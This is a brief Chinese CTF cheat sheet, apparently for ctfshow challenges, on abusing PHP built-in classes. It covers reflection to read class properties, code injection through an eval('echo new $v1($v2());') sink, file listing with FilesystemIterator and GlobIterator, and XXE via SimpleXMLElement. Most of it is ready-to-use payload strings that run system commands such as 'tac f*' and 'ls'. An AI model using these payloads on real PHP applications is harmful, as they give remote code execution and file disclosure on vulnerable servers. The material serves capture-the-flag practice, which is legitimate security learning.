^
## **flag在某个类的属性里**
代码执行
```
要读取一个类信息
var_dump(get_class_vars('ctfshow'));

反射获取类信息
echo new ReflectionClass('ctfshow');
```

## **eval和new类结合**
```
eval("echo new $v1($v2());");

让new后面有个正常的类不报错，后拼接操作。payload:
v1=Exception();system('tac f*');//&v2=a



法二 匿名类+魔术方法 
v1=class{ public function __construct(){system('tac fl*');}};&v2=w



或使用echo直接让$v1触发__toString()，此时传递的$v2参数会被输出。
这里需要对v2后面的括号进行解释，如v2=system(ls)，$v2()会把 $v2 返回的值会作为函数Q名去调用，但是调用失败了。

v1=ReflectionClass&v2=phpinfo
v1=ReflectionClass&v2=system('tac f*')
v1=CachingIterator&v2=system(ls)
v1=Exception&v2=system(ls)
```
如果有过滤不能使用()，使用getcwd()方法，无需传参返回当前所在目录。
而FilesystemIterator构造方法根据目录返回第一个文件名。这个文件名一般就是flag文件且可以直接访问
```
v1=FilesystemIterator&v2=getcwd
eval("echo new FilesystemIterator(getcwd());");
```


^
## **存在XXE的类**
PHP的内置类
SimpleXMLElement
对象
```
// 解析 XML 数据
$xmlData = '<root><element>value</element></root>';
$xml = new SimpleXMLElement($xmlData);

// 解析 XML 文件 
URL$xmlUrl = 'http://example.com/example.xml';
$xml = new SimpleXMLElement($xmlUrl, 0, TRUE);
此时外链的xml是存在xxe即可。
```


^
## **搜索文件名的类**
列出当前目录.php结尾有什么文件。
```
new GlobIterator("./*.php",0);
GlobIterator&param=./*.php&param2=0
```